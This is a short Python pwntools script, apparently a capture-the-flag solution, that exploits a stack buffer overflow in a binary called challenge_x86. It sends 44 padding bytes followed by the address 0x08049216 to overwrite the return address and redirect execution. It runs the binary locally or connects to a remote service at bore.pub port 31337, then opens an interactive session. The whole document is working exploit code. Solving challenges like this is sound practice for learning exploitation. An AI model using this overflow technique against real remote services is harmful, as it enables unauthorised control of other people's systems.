from pwn import *

elf = ELF('./challenge_x86')
context.binary = elf

offset = 44
flag_address = 0x08049216

payload = b'A' * offset
payload += pack(flag_address)

# test locally first
p = process('./challenge_x86')
#or
p = remote('bore.pub', 31337)

# Send 1 after receive '>'
p.sendlineafter(b'>', b'1')

# Send payload after getting 'name?'
p.sendlineafter(b'name? ', payload)

p.interactive()